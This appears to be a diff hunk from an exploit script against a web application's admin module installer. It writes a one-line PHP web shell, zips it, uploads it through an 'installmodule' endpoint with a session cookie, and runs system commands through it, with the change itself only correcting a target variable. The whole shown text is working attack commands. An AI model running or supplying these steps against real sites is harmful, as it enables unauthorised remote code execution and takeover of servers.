@@ -322,7 +322,7 @@ echo -n '<?=`$_GET[cmd]`?>' | tee x.php
 
 +---------- Upload Webshell  ----------+
 zip x.zip x.php
-curl -s -i -X POST -F "sendfile=@x.zip;type=application/zip" -F "submit=Upload" "http://%TARGET/admin.php?action=installmodule" -H "Cookie: PHPSESSID=$PHPSESSID" | grep -oP 'The module has been installed successfully.'
+curl -s -i -X POST -F "sendfile=@x.zip;type=application/zip" -F "submit=Upload" "http://$TARGET/admin.php?action=installmodule" -H "Cookie: PHPSESSID=$PHPSESSID" | grep -oP 'The module has been installed successfully.'
 
 +---------- Execute Command ----------+
 curl -G --path-as-is 'http://$TARGET/data/modules/x/x.php' --data-urlencode 'cmd=whoami /priv'
